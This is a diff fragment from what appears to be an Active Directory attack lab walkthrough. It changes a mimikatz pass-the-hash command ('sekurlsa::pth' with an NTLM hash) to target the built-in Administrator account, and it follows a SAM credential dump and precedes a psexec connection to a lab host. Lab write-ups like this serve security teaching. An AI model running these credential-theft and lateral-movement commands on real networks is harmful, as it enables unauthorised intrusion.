@@ -31,7 +31,7 @@ lsadump::sam
 Next, we use the PTH-function in mimikatz to start a shell with the hash of the local admin account (RID 500).
 
 ```
-sekurlsa::pth /user:adminuser /ntlm:7dfa0531d73101ca080c7379a9bff1c7 /domain:doesnotmatter
+sekurlsa::pth /user:Administrator /ntlm:7dfa0531d73101ca080c7379a9bff1c7 /domain:doesnotmatter
 ```
 
 Finally, connect to adsec-01 using psexec.
